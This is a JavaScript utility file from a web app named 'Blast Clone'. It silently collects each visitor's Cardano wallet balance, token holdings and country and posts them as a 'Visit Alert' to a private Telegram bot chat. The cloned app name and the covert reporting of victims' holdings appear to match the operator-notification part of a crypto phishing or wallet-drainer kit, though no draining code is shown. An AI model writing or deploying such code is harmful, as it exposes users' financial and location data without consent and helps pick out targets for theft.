// utils/telegramUtils.js
import axios from "axios";
import { getUserCountry } from "./getUserLocation";  // Ensure correct file import

// Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.OTELEGRAM_CHAT_ID;

// Function to send a message to Telegram
export const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "Markdown"  // Enables Markdown for text formatting in Telegram
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};

// Function to send app details  to Telegram
export const sendAppDetailsToTelegram = async (balance, tokens) => {
  let tokenDetails = tokens.map(
    (token) => `| ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
  );

  // Fetch the full user country details (name and code)
  let userCountryData = await getUserCountry();

  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX" }; // Default fallback
  }

  const { country, countryCode } = userCountryData;
  const globeIcon = "🌍";  // Unicode globe icon

  let message = `*Visit Alert*\n` +
    `App: Blast Clone\n\n` +
    `User Info--------------------\n` +
    `| Country: ${globeIcon} ${country} |\n` +
    `--------------------------------\n` +
    `| User Wallet Balance |\n` +
    `| ADA: ${balance.toFixed(2)} ADA       |\n` +
    `${tokenDetails.join("\n")}\n` +
    `------------------------------End`;

  // Send the message to Telegram
  await sendMessageToTelegram(message);
};
